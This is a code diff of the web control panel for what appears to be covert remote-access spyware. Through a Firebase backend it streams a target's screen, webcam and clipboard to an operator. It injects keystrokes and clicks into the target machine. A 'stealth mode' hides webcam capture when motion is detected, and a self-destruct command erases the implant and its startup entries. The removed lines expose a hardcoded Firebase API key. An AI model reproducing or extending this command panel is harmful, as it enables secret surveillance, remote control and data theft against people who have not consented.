@@ -6,218 +6,211 @@
     <title>Ghost Control Panel - RealTime</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        #remote-cursor { transition: all 0.1s ease-out; pointer-events: none; z-index: 50; }
-        .clipboard-item { @apply bg-slate-800 p-2 rounded text-[11px] border-l-2 border-blue-500 break-all relative animate-in fade-in slide-in-from-right-2; }
+        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
+        #remote-cursor { position: absolute; pointer-events: none; width: 14px; height: 14px; background: #ef4444; border: 2px solid white; border-radius: 50%; box-shadow: 0 0 10px rgba(239, 68, 68, 0.8); z-index: 50; transition: all 0.1s ease-out; }
+        .motion-alert { animation: pulse-red 1.5s infinite; }
+        @keyframes pulse-red { 
+            0%, 100% { border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.1); } 
+            50% { border-color: rgba(239, 68, 68, 1); background: rgba(239, 68, 68, 0.3); } 
+        }
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
-        .motion-alert { animation: pulse-red 1s infinite; }
-        @keyframes pulse-red { 0%, 100% { background: rgba(220, 38, 38, 0.2); } 50% { background: rgba(220, 38, 38, 0.5); } }
     </style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex flex-col overflow-hidden font-sans">
+<body class="bg-[#020617] text-slate-200 min-h-screen font-sans overflow-x-hidden">
 
-    <!-- Header Section -->
-    <header class="p-4 bg-slate-800 border-b border-slate-700 flex justify-between items-center shrink-0 shadow-xl">
-        <div class="flex items-center gap-4">
-            <h1 class="font-bold text-lg flex items-center gap-2">
-                <span class="bg-red-600 p-1.5 rounded shadow-lg animate-pulse">🔴</span> 
-                <span>Ghost Control Center</span>
-            </h1>
-            <button id="kill-switch" class="bg-red-900/30 hover:bg-red-600 text-red-500 hover:text-white border border-red-900/50 px-3 py-1.5 rounded text-[10px] font-black uppercase transition-all">Self Destruct</button>
+    <!-- Navbar -->
+    <nav class="p-4 border-b border-slate-800 glass sticky top-0 z-[100] flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div id="status-indicator" class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+            <h1 class="font-black tracking-tighter text-2xl italic text-white uppercase">GHOST<span class="text-blue-500 font-light">NODE</span></h1>
         </div>
-        <div class="flex items-center gap-3 bg-slate-950 border border-slate-700 px-4 py-1.5 rounded-full text-[10px]">
-            <span class="text-slate-500 uppercase tracking-widest">Cam Status:</span>
-            <span id="cam-status" class="text-blue-400 font-bold tracking-widest">CONNECTING...</span>
+        <div class="flex gap-3">
+            <button onclick="sendCommand('reset_camera')" class="bg-blue-600/20 text-blue-400 border border-blue-500/50 hover:bg-blue-600 hover:text-white px-4 py-2 rounded-lg text-xs font-black transition-all">RESTART CAMERA</button>
+            <button onclick="confirmSelfDestruct()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-xs font-black transition-all shadow-lg shadow-red-900/20">SELF DESTRUCT</button>
         </div>
-    </header>
+    </nav>
 
-    <main class="flex-1 flex flex-col md:flex-row overflow-hidden">
+    <main class="p-6 grid grid-cols-12 gap-6">
         
-        <!-- Live Stream Area (Left Side) -->
-        <div class="flex-[3] relative bg-black flex flex-col items-center justify-center p-2 overflow-hidden border-r border-slate-800">
-            <div id="screen-container" class="relative max-w-full max-h-full border border-slate-700 shadow-2xl cursor-crosshair group">
-                <img id="stream-img" src="" class="hidden max-w-full max-h-[82vh] object-contain" draggable="false">
-                
-                <!-- Real-time Virtual Cursor -->
-                <div id="remote-cursor" class="absolute w-5 h-5 hidden">
-                    <svg viewBox="0 0 24 24" fill="white" stroke="black" stroke-width="1.5"><path d="M3 3l7.07 16.97 2.51-7.39 7.39-2.51L3 3z"/></svg>
+        <!-- Left Section: Screen View -->
+        <div class="col-span-12 lg:col-span-8 space-y-4">
+            <div class="glass p-2 rounded-2xl overflow-hidden relative group" id="screen-container" onclick="handleScreenClick(event)">
+                <div id="remote-cursor"></div>
+                <img id="live-screen" src="" class="w-full h-auto rounded-xl bg-slate-900 min-h-[400px] object-contain" alt="Waiting for screen signal...">
+                <div class="absolute top-6 left-6 flex items-center gap-2 bg-black/60 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10 shadow-xl">
+                    <span class="w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
+                    <span class="text-[10px] font-mono font-bold tracking-widest uppercase">Live View</span>
                 </div>
             </div>
 
-            <!-- Floating Camera Window (PIP Mode) -->
-            <div id="cam-box" class="absolute bottom-6 right-6 w-64 aspect-video bg-slate-800 border-2 border-slate-700 rounded-xl shadow-2xl overflow-hidden">
-                <!-- Motion Detected Overlay -->
-                <div id="cam-placeholder" class="absolute inset-0 flex flex-col items-center justify-center gap-3 text-center p-4 bg-slate-900 hidden">
-                    <span class="text-[10px] text-red-500 font-black tracking-tighter">⚠️ MOTION DETECTED - CAM KILLED</span>
-                    <button onclick="resetCamera()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-1.5 rounded-lg text-[11px] font-bold shadow-lg transition-all">RESTART CAMERA</button>
-                </div>
-                
-                <img id="cam-img" src="" class="absolute inset-0 w-full h-full object-cover hidden">
-                
-                <div class="absolute top-2 left-2 bg-black/60 px-2 py-0.5 rounded text-[9px] flex items-center gap-1.5">
-                    <span id="rec-dot" class="w-2 h-2 bg-slate-500 rounded-full"></span> 
-                    <span class="font-bold tracking-tighter uppercase">Live Cam</span>
-                </div>
+            <!-- Interaction Bar -->
+            <div class="glass p-4 rounded-2xl flex gap-3 shadow-2xl">
+                <input id="key-input" type="text" placeholder="Type something to send as keystrokes..." class="bg-slate-950/50 border border-slate-700/50 px-5 py-3 rounded-xl flex-1 focus:outline-none focus:border-blue-500/50 text-sm transition-all font-mono">
+                <button onclick="sendText()" class="bg-white text-black px-8 py-3 rounded-xl font-black hover:bg-blue-50 transition-all text-sm uppercase tracking-tighter">Press Enter</button>
             </div>
         </div>
 
-        <!-- Sidebar (Controls & Logs - Right Side) -->
-        <div class="flex-1 bg-slate-800 p-4 flex flex-col gap-6 overflow-y-auto md:w-80">
+        <!-- Right Section: Camera & Data -->
+        <div class="col-span-12 lg:col-span-4 space-y-6">
             
-            <!-- Clipboard History -->
-            <div class="bg-slate-900 rounded-xl p-4 border border-slate-700 shadow-inner">
-                <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest mb-4 border-b border-slate-800 pb-2">📋 Remote Clipboard</h3>
-                <div id="clipboard-list" class="flex flex-col gap-2 max-h-56 overflow-y-auto pr-1">
-                    <div class="text-slate-600 text-[10px] italic">No data yet...</div>
+            <!-- Camera Module -->
+            <div id="cam-box" class="glass p-3 rounded-2xl aspect-video relative flex items-center justify-center bg-black/40 border-2 border-transparent transition-all overflow-hidden">
+                <img id="live-camera" src="" class="w-full h-full object-cover rounded-xl hidden">
+                <div id="cam-placeholder" class="text-center space-y-3">
+                    <div class="w-16 h-16 bg-slate-800/50 rounded-full flex items-center justify-center mx-auto border border-slate-700">
+                        <svg class="w-8 h-8 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                    </div>
+                    <p id="cam-status-msg" class="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest">Camera Standby</p>
+                </div>
+                <div class="absolute top-4 right-4 bg-black/80 backdrop-blur-md border border-white/10 px-3 py-1 rounded-lg flex items-center gap-2">
+                    <span id="cam-dot" class="w-1.5 h-1.5 bg-slate-500 rounded-full"></span>
+                    <span id="cam-txt" class="text-[9px] font-black uppercase">Offline</span>
                 </div>
             </div>
 
-            <!-- Remote Input Controls -->
-            <div class="bg-slate-900 rounded-xl p-4 border border-slate-700 shadow-inner">
-                <h3 class="text-[10px] font-black text-green-400 uppercase tracking-widest mb-4 border-b border-slate-800 pb-2">⌨️ Type & Interaction</h3>
-                <div class="flex flex-col gap-4">
-                    <div class="relative">
-                        <input type="text" id="keyboard-input" autocomplete="off" placeholder="Type on remote PC..." 
-                            class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-sm outline-none focus:border-blue-500 transition-all">
-                        <button id="send-btn" class="absolute right-1.5 top-1.5 bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-[10px] font-bold">SEND</button>
-                    </div>
-                    <div class="grid grid-cols-3 gap-2">
-                        <button onclick="sendSpecialKey('enter')" class="bg-slate-700 hover:bg-slate-600 p-2 rounded text-[10px] font-bold">Enter</button>
-                        <button onclick="sendSpecialKey('backspace')" class="bg-slate-700 hover:bg-slate-600 p-2 rounded text-[10px] font-bold">Del</button>
-                        <button onclick="sendSpecialKey('esc')" class="bg-slate-700 hover:bg-slate-600 p-2 rounded text-[10px] font-bold">Esc</button>
-                    </div>
+            <!-- Clipboard/Log History -->
+            <div class="glass p-5 rounded-2xl flex-1 flex flex-col gap-4 min-h-[300px]">
+                <div class="flex justify-between items-center border-b border-slate-800/50 pb-3">
+                    <h3 class="text-xs font-black text-blue-500 uppercase tracking-widest">Clipboard Logs</h3>
+                    <span class="text-[9px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded border border-blue-500/20 font-bold uppercase">Real-time</span>
+                </div>
+                <div id="clipboard-list" class="flex flex-col gap-2.5 overflow-y-auto max-h-[400px] pr-2">
+                    <!-- Logs injection here -->
                 </div>
             </div>
 
-            <!-- Help/Tips -->
-            <div class="mt-auto p-3 rounded-lg bg-blue-900/10 border border-blue-900/30">
-                <p class="text-[9px] text-blue-400 leading-relaxed">
-                    <b>Tip:</b> If the camera stays OFF, ensure no movement is happening in front of the lens. Camera auto-starts after 1 min of complete inactivity.
-                </p>
-            </div>
         </div>
     </main>
 
+    <!-- Overlay Alert for Self Destruct -->
+    <div id="destruct-modal" class="fixed inset-0 bg-black/90 backdrop-blur-xl z-[200] hidden items-center justify-center p-6 text-center">
+        <div class="max-w-md space-y-6">
+            <div class="w-24 h-24 bg-red-600/20 rounded-full flex items-center justify-center mx-auto border-2 border-red-600 animate-pulse">
+                <svg class="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+            </div>
+            <h2 class="text-3xl font-black italic uppercase">System Purge Initiated</h2>
+            <p class="text-slate-400 text-sm leading-relaxed font-mono">All files, startup entries, and traces are being wiped from the target machine. The connection will close permanently.</p>
+        </div>
+    </div>
+
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-        const firebaseConfig = { 
-            apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk", 
-            authDomain: "sainfoxiya-com-a7733.firebaseapp.com", 
-            projectId: "sainfoxiya-com-a7733", 
-            appId: "1:639762867502:web:826662477ce123110fc6bf" 
-        };
-
-        const appId = "sainfoxiya-com-a7733";
+        const firebaseConfig = JSON.parse(__firebase_config);
         const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
         const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'sainfoxiya-com-a7733';
 
-        const streamImg = document.getElementById('stream-img');
-        const camImg = document.getElementById('cam-img');
-        const camStatus = document.getElementById('cam-status');
-        const screenContainer = document.getElementById('screen-container');
-        const remoteCursor = document.getElementById('remote-cursor');
-        const keyboardInput = document.getElementById('keyboard-input');
-        const camPlaceholder = document.getElementById('cam-placeholder');
-        const recDot = document.getElementById('rec-dot');
-        const camBox = document.getElementById('cam-box');
+        let user = null;
 
-        signInAnonymously(auth);
-        onAuthStateChanged(auth, (user) => { if(user) startRealtimeSync(); });
-
-        // Remote Action Dispatcher
-        async function sendAction(data) {
-            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), { 
-                ...data, timestamp: serverTimestamp(), processed: false 
-            });
+        // --- AUTH ---
+        async function init() {
+            try {
+                const res = await signInAnonymously(auth);
+                user = res.user;
+                setupListeners();
+            } catch (err) {
+                console.error("Auth Error:", err);
+            }
         }
+        init();
 
-        // Action Handlers
-        window.resetCamera = () => sendAction({ type: 'reset_camera' });
-        window.sendSpecialKey = (key) => sendAction({ type: 'special_key', value: key });
+        function setupListeners() {
+            if(!user) return;
 
-        document.getElementById('send-btn').onclick = () => {
-            if(!keyboardInput.value.trim()) return;
-            sendAction({ type: 'text', value: keyboardInput.value });
-            keyboardInput.value = '';
-        };
-
-        document.getElementById('kill-switch').onclick = () => {
-            if(confirm("ALERT: This will permanently remove the tracker from the target. Proceed?")) 
-                sendAction({ type: 'self_destruct' });
-        };
-
-        // Capture Screen Click Coordinates
-        screenContainer.addEventListener('click', (e) => {
-            const rect = screenContainer.getBoundingClientRect();
-            sendAction({ 
-                type: 'click', 
-                relX: (e.clientX - rect.left)/rect.width, 
-                relY: (e.clientY - rect.top)/rect.height 
-            });
-        });
-
-        // LIVE REAL-TIME SYNC (No Refresh Loop)
-        function startRealtimeSync() {
-            // 1. Live Screen Stream
+            // 1. Screen Monitor
             onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
-                if(snap.exists()){
-                    const d = snap.data();
-                    if(d.frame) {
-                        streamImg.src = d.frame;
-                        streamImg.classList.remove('hidden');
-                    }
-                    remoteCursor.style.left = (d.cursorX * 100) + '%';
-                    remoteCursor.style.top = (d.cursorY * 100) + '%';
-                    remoteCursor.classList.remove('hidden');
+                if(snap.exists()) {
+                    const data = snap.data();
+                    const screenImg = document.getElementById('live-screen');
+                    const cursor = document.getElementById('remote-cursor');
+                    
+                    if(data.frame) screenImg.src = data.frame;
+                    cursor.style.left = (data.cursorX * 100) + '%';
+                    cursor.style.top = (data.cursorY * 100) + '%';
                 }
             });
 
-            // 2. Live Camera & Motion State
+            // 2. Camera Monitor
             onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
-                if(snap.exists()){
-                    const d = snap.data();
-                    camStatus.innerText = d.status || "IDLE";
-                    
-                    if(d.frame) {
-                        camImg.src = d.frame;
+                if(snap.exists()) {
+                    const data = snap.data();
+                    const camImg = document.getElementById('live-camera');
+                    const placeholder = document.getElementById('cam-placeholder');
+                    const box = document.getElementById('cam-box');
+                    const dot = document.getElementById('cam-dot');
+                    const txt = document.getElementById('cam-txt');
+                    const msg = document.getElementById('cam-status-msg');
+
+                    if(data.frame && !data.motion) {
+                        camImg.src = data.frame;
                         camImg.classList.remove('hidden');
-                        camPlaceholder.classList.add('hidden');
-                        camBox.classList.remove('motion-alert');
-                        recDot.className = "w-2 h-2 bg-red-600 rounded-full animate-pulse shadow-[0_0_8px_red]";
+                        placeholder.classList.add('hidden');
+                        dot.className = "w-1.5 h-1.5 bg-green-500 rounded-full";
+                        txt.innerText = "Live";
+                        box.classList.remove('motion-alert');
                     } else {
                         camImg.classList.add('hidden');
-                        camPlaceholder.classList.remove('hidden');
-                        recDot.className = "w-2 h-2 bg-slate-500 rounded-full";
-                    }
-
-                    if(d.motion) {
-                        camStatus.className = "text-red-500 font-black animate-pulse uppercase";
-                        camBox.classList.add('motion-alert');
-                    } else {
-                        camStatus.className = "text-blue-400 font-bold uppercase";
-                        camBox.classList.remove('motion-alert');
+                        placeholder.classList.remove('hidden');
+                        dot.className = "w-1.5 h-1.5 bg-red-600 rounded-full";
+                        txt.innerText = data.motion ? "Motion" : "Off";
+                        msg.innerText = data.motion ? "Stealth Mode: Motion Detected" : "Waiting for Permission";
+                        if(data.motion) box.classList.add('motion-alert');
+                        else box.classList.remove('motion-alert');
                     }
                 }
             });
 
-            // 3. Live Clipboard Logs
-            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(8));
+            // 3. Clipboard Feed
+            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(12));
             onSnapshot(q, (snap) => {
-                const list = document.getElementById('clipboard-list');
-                list.innerHTML = '';
-                if(snap.empty) list.innerHTML = '<div class="text-slate-600 text-[10px] italic">No active logs...</div>';
-                snap.forEach(s => {
-                    const item = document.createElement('div');
-                    item.className = 'clipboard-item';
-                    item.innerText = s.data().text;
-                    list.appendChild(item);
+                const container = document.getElementById('clipboard-list');
+                container.innerHTML = '';
+                snap.forEach(doc => {
+                    const log = document.createElement('div');
+                    log.className = "bg-slate-900/80 p-3 rounded-xl border border-white/5 text-[11px] font-mono break-all hover:border-blue-500/30 transition-all";
+                    log.innerText = doc.data().text;
+                    container.appendChild(log);
                 });
             });
         }
+
+        // --- ACTIONS ---
+        window.sendCommand = async (type, extra = {}) => {
+            if(!user) return;
+            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
+                type, ...extra, timestamp: serverTimestamp()
+            });
+        };
+
+        window.sendText = () => {
+            const el = document.getElementById('key-input');
+            if(el.value.trim()) {
+                sendCommand('text', { value: el.value });
+                el.value = '';
+            }
+        };
+
+        window.handleScreenClick = (e) => {
+            const rect = e.target.getBoundingClientRect();
+            const relX = (e.clientX - rect.left) / rect.width;
+            const relY = (e.clientY - rect.top) / rect.height;
+            sendCommand('click', { relX, relY });
+        };
+
+        window.confirmSelfDestruct = () => {
+            const modal = document.getElementById('destruct-modal');
+            if(confirm("DANGER: This will delete the executable and all startup files on the remote PC. Connection will be lost forever. Proceed?")) {
+                sendCommand('self_destruct');
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+            }
+        };
+
     </script>
 </body>
 </html>
